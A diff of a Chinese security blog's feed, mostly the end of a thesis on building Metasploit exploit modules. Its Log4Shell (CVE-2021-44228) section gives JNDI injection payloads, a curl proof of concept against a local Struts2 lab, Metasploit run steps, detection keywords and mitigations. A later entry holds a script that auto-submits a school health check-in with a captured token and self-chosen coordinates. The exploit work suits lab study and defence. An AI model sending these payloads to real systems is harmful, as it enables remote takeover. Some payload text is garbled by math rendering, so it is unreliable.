+<p>现在，将执行流重定向到执行 POP POP RET 指令的缓冲区中：<br>
+<img src="https://abraxasfever.github.io//post-images/1726325315394.png" alt="" loading="lazy"><br>
+图3.11遵循POP POP RET 说明</p>
+<p><img src="https://abraxasfever.github.io//post-images/1726325319826.png" alt="" loading="lazy"><br>
+图3.12执行 NOPSLED</p>
+<p>到目前为止，是时候获取Meterpreter shell了，在没有调试器的情况下重新运行漏洞利用程序：<br>
+<img src="https://abraxasfever.github.io//post-images/1726325324174.png" alt="" loading="lazy"><br>
+图3.13运行EXP程序会话</p>
+<p>至此已经Fuzz测试了一个易受攻击的服务器，并使用Metasploit提供的惊人功能构建了一个自定义的漏洞利用模块。<br>
+第四章  	基于Metasploit框架开发Log4shell漏洞利用模块<br>
+4.1 	Log4shell漏洞介绍<br>
+Apache Log4j2 是一个基于Java 的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。<br>
+2021年12月10日，Apache发布了其Log4j框架的2.15.0版本，其中包括对CVE-2021-44228的修复，CVE-2021-44228是影响Apache Log4j 2.14.1及更早版本的关键（CVSSv3 10）远程执行代码（RCE）漏洞。该漏洞存在于 Log4j 处理器处理特制日志消息的方式中。由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，包含类似内容的不受信任的字符串将触发远程类加载、消息查找以及关联内容的执行。实现目标服务器的任意代码执行，获得目标服务器权限。成功利用 CVE-2021-44228 可允许未经身份验证的远程攻击者完全控制易受攻击的目标系统。<br>
+该漏洞影响范围极广、危害极大，主要由于该组件应用范围十分广泛，所有使用该组件的所有产品都会受到漏洞影响，因此对其下游造成的软件供应链安全隐患巨大。<br>
+4.2 	漏洞产生原因分析<br>
+Apache Log4j2远程代码执行漏洞由主要是由Lookup功能引发的。Log4j2在默认情况下会开启Lookup功能，用于将一些特殊值添加到日志之中，它是允许通过一些协议去读取相应环境中的配置。这个功能也支持对JNDI的Lookup，但由于Lookup对于加载的JNDI内容未做任何限制，使得攻击者可以通过JNDI注入实现远程加载恶意类到应用中，从而造成RCE（远程代码执行）。<br>
+通过对源码进行追踪调试，可以看到一系列的调用链。整个调用链非常长，涉及到的类和方法非常多。这些都可以作为构造Payload语句使用，现在最受网络安全人员关注的是 Interpolator#lookup()的方法，这也是众多Payload所利用的方法，源码如下：<br>
+public <T> T lookup(final String name) throws NamingException {return (T) this.context.lookup(name);}<br>
+通过对Interpolator#lookup()源码分析可知，整个调用的过程并没有对输入的参数 name 进行合法性校验，而是直接进行调用，这样就会给攻击者可乘之机，恶意地执行非法的远程调用。<br>
+4.3 	Log4shell漏洞利用<br>
+4.3.1 	Payload<br>
+Log4shell的payload很简单，这也是为什么这个漏洞影响之大之广的原因。只需要向存在漏洞的目标传递一个“<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mrow><mi>j</mi><mi>n</mi><mi>d</mi><mi>i</mi><mo>:</mo><mi>l</mi><mi>d</mi><mi>a</mi><mi>p</mi><mo>:</mo><mi mathvariant="normal">/</mi><mi mathvariant="normal">/</mi><mi>e</mi><mi>x</mi><mi>a</mi><mi>m</mi><mi>p</mi><mi>l</mi><mi>e</mi><mi mathvariant="normal">.</mi><mi>c</mi><mi>o</mi><mi>m</mi><mi mathvariant="normal">/</mi><mi>a</mi></mrow><mi mathvariant="normal">”</mi><mi mathvariant="normal">格</mi><mi mathvariant="normal">式</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">语</mi><mi mathvariant="normal">句</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">旦</mi><mi mathvariant="normal">目</mi><mi mathvariant="normal">标</mi><mi mathvariant="normal">系</mi><mi mathvariant="normal">统</mi><mi mathvariant="normal">的</mi><mi>l</mi><mi>o</mi><mi>g</mi><mn>4</mn><mi>j</mi><mi mathvariant="normal">发</mi><mi mathvariant="normal">现</mi><mi mathvariant="normal">日</mi><mi mathvariant="normal">志</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">包</mi><mi mathvariant="normal">含</mi><mi mathvariant="normal">“</mi></mrow><annotation encoding="application/x-tex">{jndi:ldap://example.com/a}”格式的语句，一旦目标系统的log4j发现日志中包含“</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">i</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">/</span><span class="mord">/</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord">.</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">m</span><span class="mord">/</span><span class="mord mathdefault">a</span></span><span class="mord">”</span><span class="mord cjk_fallback">格</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">语</span><span class="mord cjk_fallback">句</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">旦</span><span class="mord cjk_fallback">目</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">系</span><span class="mord cjk_fallback">统</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord">4</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mord cjk_fallback">发</span><span class="mord cjk_fallback">现</span><span class="mord cjk_fallback">日</span><span class="mord cjk_fallback">志</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">包</span><span class="mord cjk_fallback">含</span><span class="mord">“</span></span></span></span>{”就会将表达式的内容替换为表达式解析后的内容，而不是表达式本身，从而导致攻击者构造符合要求的表达式供系统执行。<br>
+因为Interpolator类以“:”作为分割，将表达式内容分割成两个部分，前面的部分作为prefix，后面的部分作为key。然后通过prefix去找对应的lookup，通过对应的lookup实例调用lookup方法，最后将key作为参数带入执行。<br>
+根据这个构造原理，我们可以很轻易的构造出所需要的Payload语句。实现对目标的远程代码执行。<br>
+4.3.2 	漏洞验证过程<br>
+基本上，所有Struts都会被远程和未经身份验证的攻击者轻易利用。<br>
+概念验证漏洞利用：<br>
+curl -vv -H &quot;If-Modified-Since: ${jndi:ldap://localhost:80/abc}&quot; http://localhost:8080/struts2-showcase/struts/utils.js<br>
+入侵验证：<br>
+此日志条目来自 catalina.out 文件：<br>
+2022-04-25 17:58:45,991 WARN  [http-nio-8080-exec-2] dispatcher.DefaultStaticContentLoader (DefaultStaticContentLoader.java:241) - Invalid If-Modified-Since header value: '<span class='katex-error' title='ParseError: KaTeX parse error: Expected &#039;}&#039;, got &#039;EOF&#039; at end of input: …header value: &#039;'>{jndi:ldap://localhost:80/abc}&#039;, ignoring
+Apache Struts 2框架包含各种UI组件所需的静态文件（Javascript，CSS等）。查找和“服务”这些组件由 struts2 类 DefaultStaticContentLoader 处理。
+DefaultStaticContentLoader 容易受到 Log4j CVE-2021-44228 的影响。具体来说，它有这样一块代码：
+protected void process(InputStream is, String path, HttpServletRequest request, HttpServletResponse response) throws IOException {
+  if (is != null) {
+      Calendar cal = Calendar.getInstance();   //检查是否进行了修改
+      long ifModifiedSince = 0;
+      try {
+          ifModifiedSince = request.getDateHeader(&quot;If-Modified-Since&quot;);
+      } catch (Exception e) {
+          LOG.warn(&quot;Invalid If-Modified-Since header value: &#039;{}&#039;, ignoring&quot;, request.getHeader(&quot;If-Modified-Since&quot;));
+      }
+可以看到这部分是用于检查日期是否有效，并在无效时发出警告。因此，要利用这一点，只需要请求一个具有恶意包头的数据包。
+下面是一个针对 struts2-showcase 的Payload语句：
+curl -vv -H &quot;If-Modified-Since: \${jndi:ldap://localhost:80/abc}&quot; http://localhost:8080/struts2-showcase/struts/utils.js
+上面的Payload语句会生成一条日志消息，如下所示：
+2021-12-11 17:58:45,991 WARN  [http-nio-8080-exec-2] dispatcher.DefaultStaticContentLoader (DefaultStaticContentLoader.java:241) - Invalid If-Modified-Since header value: &#039;</span>{jndi:ldap://localhost:80/abc}', ignoring<br>
+Struts 2默认有一些静态项，由于所有 Apache Struts基本上都使用了默认的选项，所以极其容易受到该漏洞的利用攻击。<br>
+4.3.3 	Log4shell漏洞利用模块<br>
+POC和EXP最大的差别就在于POC是没有后续攻击手段的，无法在确定漏洞之后进行下一步的漏洞利用，根据POC完成一个EXP并不是很困难的事情，在POC的基础上加入Shellcode的构造就可以了，log4j2支持很多的协议，例如通过Ldap查找变量，通过docker查找变量等。在代码中通过Ldap构造Payload，${jndi:ldap://xxx.xxx.xxx.xxx/exp},通过Jndi注入，借助Ldap服务来下载执行恶意payload，从而执行命令。<br>
+<img src="https://abraxasfever.github.io//post-images/1726325388567.png" alt="" loading="lazy"><br>
+图4.1Log4jshell漏洞利用流程图</p>
+<p>整个利用流程分两步：<br>
+第一步：向目标发送指定 payload，目标对 payload 进行解析执行，然后会通过 ldap 链接远程服务，当 ldap 服务收到请求之后，将请求进行重定向到恶意 java class 的地址。<br>
+第二步：目标服务器收到重定向请求之后，下载恶意 class 并执行其中的代码，从而执行系统命令。<br>
+根据这个思路，就构造了如下这个复杂的Payload：<br>
+&quot;${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/dc=#{Rex::Text.rand_text_alpha_lower(6)},dc=#{Rex::Text.rand_text_alpha_lower(3)}}&quot;<br>
+完整的漏洞利用模块代码见附录中Log4shell漏洞利用模块代码。<br>
+4.4 	模块分析<br>
+受 CVE-2021-44228 影响的Apache Log4j2版本允许在配置、日志消息和参数中使用JNDI功能，无法抵御攻击者使用的LDAP和其他与JNDI相关的节点。<br>
+这个漏洞利用模块将通过注入格式消息来利用具有Log4Shell漏洞的HTTP端，该消息将触发与Metasploit的LDAP连接并加载Payload。<br>
+自动目标使用远程类装入提供 Java Payload。这要求Metasploit除了运行目标可以连接到的LDAP服务器之外，还要运行HTTP服务器。目标应用程序必须启用受信任的代码库选项，此技术才能正常工作。<br>
+非自动目标通过序列化的 Java 对象传递Payload时，不需要Metasploit运行HTTP服务器，而是利用LDAP服务器来发送序列化对象。在这种情况下，攻击目标应用程序必须与用户指定的JAVA_GADGET_CHAIN选项兼容。<br>
+4.5 	验证过程<br>
+针对于Apache Log4j2进行log4j2漏洞验证过程如下：</p>
+<ol>
+<li>设置易受攻击的 Apache Struts2 实例</li>
+<li>启动 Msfconsole</li>
+<li>执行use exploit/multi/http/log4shell_header_injection</li>
+<li>设置选项SRVHOST RHOSTS RPORT TARGETURI，对于 Struts2，设置TARGETURI /struts2-showcase/</li>
+<li>如果使用“自动”外的目标，可以选择更改设置JAVA_GADGET_CHAIN</li>
+<li>执行run</li>
+<li>如果目标容易受到攻击，则会执行payload<br>
+4.6 	漏洞复现<br>
+1.使用docker搭建Apache Struts2<br>
+┌──(root㉿kali)-[~]<br>
+└─# docker build . -t struts2:2.5.28<br>
+2启动Apache Struts2<br>
+┌──(root㉿kali)-[~]<br>
+└─# docker run --name struts2 --rm -p 8080:8080 struts2:2.5.28<br>
+执行结果如图4.2所示，会启动Apache Struts2和tomcat。<br>
+<img src="https://abraxasfever.github.io//post-images/1726325396057.png" alt="" loading="lazy"><br>
+图4.2使用docker启动Apache Struts2</li>
+</ol>
+<p>3.启动msfconsole<br>
+┌──(root㉿kali)-[~]<br>
+└─# msfconsole<br>
+5.运行log4shell漏洞利用模块<br>
+use exploit/multi/http/log4shell_header_injection<br>
+6.设置rhost/rport/srvhost/targeturi/target/payload/lhost<br>
+7.对漏洞进行检测命令check，如图4.3所示<br>
+<img src="https://abraxasfever.github.io//post-images/1726325402095.png" alt="" loading="lazy"><br>
+图4.3漏洞检查</p>
+<p>发现了一个log4shell漏洞<br>
+8.	执行漏洞利用命令exploit<br>
+<img src="https://abraxasfever.github.io//post-images/1726325407268.png" alt="" loading="lazy"><br>
+图4.4漏洞利用完成</p>
+<p>至此，该模块完成了对log4shell漏洞的利用，实现RCE远程代码执行。<br>
+4.7 	入侵排查以及漏洞修复<br>
+针对Apache Log4j2的漏洞入侵排查以及漏洞修复方式如下：</p>
+<ol>
+<li>日志排查<br>
+攻击者在利用前通常采⽤dnslog方式进行扫描探测，对于常见利用方式可通过应用系统报错日志中对以下关键字进行排查。<br>
+&quot;javax.naming.CommunicationException&quot;<br>
+&quot;javax.naming.NamingException: problem generating object using<br>
+object factory&quot;<br>
+&quot;Error looking up JNDI resource&quot;</li>
+<li>流量排查<br>
+	排查日志或者解码后完整的请求数据包中是否存在${jndi:关键字。<br>
+	排查日志是否存在相关堆栈报错，堆栈里是否有JndiLookup、ldapURLContext、getObjectFactoryFromReference等与jndi调用相关的堆栈信息。<br>
+3.漏洞修复<br>
+排查应用是否引⼊了Apache Log4j2 Jar包，若存在依赖引入，则可能存在漏洞影响。尽快升级Apache Log4j2所有相关应用到最新的版本：<br>
+https://github.com/apache/logging-log4j2<br>
+漏洞应对措施：<br>
+	jvm参数-Dlog4j2.formatMsgNoLookups=true<br>
+	log4j2.formatMsgNoLookups=True<br>
+	系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true<br>
+第五章  	总结与展望<br>
+5.1 	论文工作总结<br>
+漏洞利用模块的开发是一门网络安全测试人员必须掌握的技术，而Metasploit框架作为当今最优秀的网络安全测试框架，也是网络安全测试人员需要经常接触的、必须掌握的渗透测试工具箱。相较于使用Python进行脚本工具的开发，基于Metasploit框架进行漏洞利用模块的开发能够更大程度的缩短开发时间，也能够更容易的开发出功能更强大的模块，进而更好的完成网络安全测试工作。虽然，该技术在国内的网络安全技术圈内并未广泛应用，但随着Metasploit的愈发强大，网络安全工作人员会越来越重视这个框架，并且更多的基于Metasploit进行漏洞利用模块的开发。<br>
+在本篇论文中，介绍了当今网络安全的发展情况，漏洞利用模块及工具的开发和使用情况以及基于Metasploit进行漏洞利用模块的开发的优势。文章首先着重分析了Metasploit框架组成，并且详细讲解了Metasploit的使用，对Metasploit的示例代码进行了细致的分析。然后从Fuzz测试器的开发原理开始，详细讲解基于Metasploit的漏洞利用模块的开发思路和过程，并基于此，对时下最出名且影响极其深远的Log4jshell漏洞进行了详细的分析，并对此进行了漏洞利用模块的开发。最后对Apache Struts2进行Log4jshell漏洞利用的复现，体现了基于Metasploit的漏洞利用模块的开发的快速，方便，功能强大的特点。<br>
+5.2 	展望<br>
+基于Metasploit进行漏洞利用模块的开发是一门技术，也是一门需要不断进行下去，不断被广大网络安全工作人员接受并使用的应用于日常工作的技术。随着网络空间的高速发展网络安全威胁成为了每一个人都需要面对的挑战和问题，对于一名网络安全工作人员而言，高效率的网络安全测试工作才能应对这高速发展的网络空间技术。2021年12月9日，随着一个Log4j2远程代码执行漏洞的POC的公开，70%以上的企业线上业务系统被影响，全世界的程序员陷入不眠之夜，即便官方及时给出了修复漏洞，但依旧被多次绕过，造成的损失无法计算。随着这个“核弹级”漏洞的曝光，我第一时间开始着手于对该漏洞的研究， 纵观全网，对Log4shell的漏洞利用复现都很“脚本小子”，对理解漏洞的原理的帮助很少，代码不易于阅读，原理解释不清。而基于Metasploit框架开发的模块往往有着很高的易读性，也便于学习漏洞原理并将所学运用于模块的开发之中。我相信，随着广大网络安全工作人员对Metasploit的进一步认识和了解，Metasploit将不再是单纯的工具集合包，而是一个千变万化的瑞士军刀，一个可以根据自己的需要而快速开发出相应模块的百宝箱。相信随着对于Metasploit的广泛使用，网络空间安全得以进一步提升。</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[我在校园自动打卡]]></title>
+        <id>https://abraxasfever.github.io/post/wo-zai-xiao-yuan-zi-dong-da-qia/</id>
+        <link href="https://abraxasfever.github.io/post/wo-zai-xiao-yuan-zi-dong-da-qia/">
+        </link>
+        <updated>2021-01-29T16:17:37.000Z</updated>
+        <content type="html"><![CDATA[<p>我在校园打卡的每日自动实现<br>
+1.首先得fiddle抓包微信小程序<br>
+因为安卓7.0版本的微信小程序已经无法轻易抓包，我使用了PC版微信自带的微信小程序，PC端微信的http服务建立在IE浏览器的基础上，所以，给IE设置代理到fiddler，轻松实现抓包获取token。<br>
+2.微信搜索喵提醒，注册喵提醒，创建一个提醒，保存喵码待会要用。<br>
+3.编写py代码，实现功能，需要改的用*代替了，代码如下。</p>
+<pre><code>import json
+import logging
+import requests, time, random
+import datetime
+logger = logging.getLogger()
+logger.setLevel(logging.INFO)
+# 健康打卡提交后字典的参数，返回中文
+def get_status(self):
+    if self['code'] == 0:
+        return &quot;自动打卡(健康打卡)成功&quot;
+    elif self['code'] == 1:
+        return &quot;健康打卡时间结束&quot;
+    elif self['code'] == -10:
+        return &quot;Token已失效,请及时更换Token值&quot;
+    else:
+        return &quot;发生未知错误,请及时检查!&quot;
+
+class Do:
+    def __init__(self):
+    
+        # 喵提醒通知
+        self.notifytoken = '****'  # 喵码  填入第一步申请的喵码
+
+        self.api = &quot;https://student.wozaixiaoyuan.com/health/save.json&quot; # 健康打卡 提交地址
+        self.headers = {
+            &quot;Host&quot;: &quot;student.wozaixiaoyuan.com&quot;,
+            &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;,
+            &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br&quot;,
+            &quot;Connection&quot;: &quot;keep-alive&quot;,
+            &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 MicroMessenger/7.0.9.501 NetType/WIFI MiniProgramEnv/Windows WindowsWechat&quot;,	# 用Fiddler抓包的User-Agent值修改
+            &quot;Referer&quot;: &quot;https://servicewechat.com/*****/page-frame.html&quot;,	# 用Fiddler抓包的Referer值修改
+            &quot;token&quot;: &quot;**************&quot;,  # 用Fiddler抓包的token值(需定期更换)修改 一个token大约能用3到4天
+             &quot;Content-Length&quot;: &quot;29&quot;,
+              }   # 以上都可以在抓包中获取参数信息  可修改
+    
+        # 健康打卡数据
+        self.data = {
+            &quot;answers&quot;: '[&quot;0&quot;,&quot;1&quot;,&quot;36.2&quot;]', 
+            #  answer是健康打卡的问题答案，从左到右依次是第一题到最后一题的答案
+            #  其中选择题的0代表第一个选项，1代表第二个选项，填空题直接打字进去就行
+            # 可以对照抓包中的Hex编码修改
+            &quot;latitude&quot;: &quot;**** &quot;, # 维度
+            &quot;longitude&quot;: &quot;**** &quot;, # 经度
+            #  填入你家所在位置的经纬度，直接在地址后面加经纬度 然后百度就知道了
+            #  都可以自己填经纬度了，改定位不用我教了吧
+            &quot;country&quot;: &quot;中国&quot;,
+            &quot;city&quot;: &quot;**市&quot;,
+            &quot;district&quot;: &quot;**区&quot;,
+            &quot;province&quot;: &quot;**省&quot;,
+            &quot;township&quot;: &quot;*****街道&quot;,
+            &quot;street&quot;: &quot;****路&quot;,
+            #  省市县路这些信息自己填进去就行
+             }  # 位置信息也是通过抓包获取之前是记录
+
+def run(self):
+    res = requests.post(self.api, headers=self.headers, data=self.data, ).json() # 健康打卡提交
+    msg = {
+        &quot;id&quot;: self.notifytoken,
+        &quot;text&quot;: datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S') + &quot;\n&quot; + &quot;现在进行云端自动打卡&quot; + &quot;\n&quot; + get_status(res),
+        &quot;type&quot;: &quot;json&quot;
+    }
+    print(type(msg))
+    requests.post(&quot;http://miaotixing.com/trigger&quot;, data=msg)  # 喵提醒的地址,会返回执行信息情况.
+    return True
+
+if __name__ == &quot;__main__&quot;:
+    Do().run()
+
+def main_handler(event, context):
+    logger.info('got event{}'.format(event))
+    return Do().run()
+</code></pre>
+<p>4.注册腾讯云，在产品里搜索云函数，创建云函数-&gt;空白模板-&gt;把修改好的代码粘贴进index.py<br>
+5.触发管理里面根据个人需求设置就好了。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[网络安全学习笔记(持续更新)]]></title>
+        <id>https://abraxasfever.github.io/post/wang-luo-an-quan-xue-xi-bi-ji/</id>
+        <link href="https://abraxasfever.github.io/post/wang-luo-an-quan-xue-xi-bi-ji/">
+        </link>
+        <updated>2020-08-09T09:13:39.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="基础">基础</h2>
+<ol>
+<li><a href="https://71x70c.coding-pages.com/post/ji-chu/">基础知识</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/xu-ni-ji/">虚拟机以及常用环境搭建</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/huan-jing-pei-zhi/">环境配置</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/zhu-ji-tan-ce/">主机配置</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/duan-kou-sao-miao/">端口扫描</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/lou-dong-sao-miao/">漏洞扫描</a></li>
+</ol>
+<h2 id="漏洞利用">漏洞利用</h2>
+<ol start="7">
+<li><a href="https://71x70c.coding-pages.com/post/web-ftp/">漏洞利用-FTP</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-ssh">漏洞利用-SSH</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-telnet">漏洞利用-Telnet</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-smtp">漏洞利用-SMTP</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-rpcbind">漏洞利用-rpcbind</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-smb">漏洞利用-smb-RCE远程命令执行</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-rlogin">漏洞利用-rlogin最高权限登陆</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-rmi">漏洞利用-rmi反序列化远程登录</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-backdoor">漏洞利用-后门连接</a></li>
+<li><a href="https://71x70c.coding-pages.com/web-post/nfs">漏洞利用-nfs获取目标密码文件</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-proftpd">漏洞利用-proftpd测试</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-mysql">漏洞利用-mysql弱口令破解</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-postgresql">漏洞利用-postgresql数据库破解</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-vnc">漏洞利用-vnc密码破解</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-irc">漏洞利用-irc后门利用</a></li>
+<li><a href="https://71x70c.coding-pages.com/post/web-tomcat">漏洞利用-tomcat管理密码破解</a></li>
+</ol>
+<h2 id="dvwa安全">DVWA安全</h2>
+<h2 id="权限提升">权限提升</h2>
+<h2 id="权限维持">权限维持</h2>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[【安鸾渗透测试】]]></title>
+        <id>https://abraxasfever.github.io/post/an-luan-shen-tou-ce-shi/</id>
+        <link href="https://abraxasfever.github.io/post/an-luan-shen-tou-ce-shi/">
+        </link>
+        <updated>2020-03-20T22:43:05.000Z</updated>
+        <content type="html"><![CDATA[<p>【基础练习】</p>
+<p>Burpsuit练习<br>
+<a href="https://71x70c.coding-pages.com/post/php-dai-ma-lian-xi/">PHP代码练习</a></p>
+<p>【SQL注入】</p>
+<p><a href="https://71x70c.coding-pages.com/post/sql-shu-zi-xing-get-zhu-ru-01/">SQL数字型GET注入01</a><br>
+<a href="https://71x70c.coding-pages.com/post/sql-zi-fu-xing-zhu-ru/">SQL字符型注入</a><br>
+<a href="https://71x70c.coding-pages.com/post/sql-sou-suo-xing-zhu-ru-02/">SQL搜索型注入02</a><br>
+<a href="https://71x70c.coding-pages.com/post/sql-shu-zi-xing-get-zhu-ru-02/">SQL数字型GET注入02</a><br>
+<a href="https://71x70c.coding-pages.com/post/cookie-zhu-ru/">Cookie注入</a><br>
+<a href="https://71x70c.coding-pages.com/post/x-forwarded-for-zhu-ru/">X-Forwarded-For注入 </a><br>
+<a href="https://71x70c.coding-pages.com/post/sql-sou-suo-xing-mang-zhu/">SQL搜索型盲注</a><br>
+<a href="https://71x70c.coding-pages.com/post/post-mang-zhu-andwan-neng-mi-ma/">POST盲注&amp;万能密码</a><br>
+<a href="https://71x70c.coding-pages.com/post/sql-bao-cuo-zhu-ru/">SQL报错注入</a><br>
+<a href="https://71x70c.coding-pages.com/post/kuan-zi-fu-zhu-ru/">宽字符注入</a><br>
+<a href="https://71x70c.coding-pages.com/post/dnslog-fang-shi-zhu-ru/">DNSlog方式注入</a><br>
+<a href="https://71x70c.coding-pages.com/post/soap-xie-yi-zhu-ru/">SOAP协议注入</a></p>
+]]></content>
+    </entry>
+</feed>
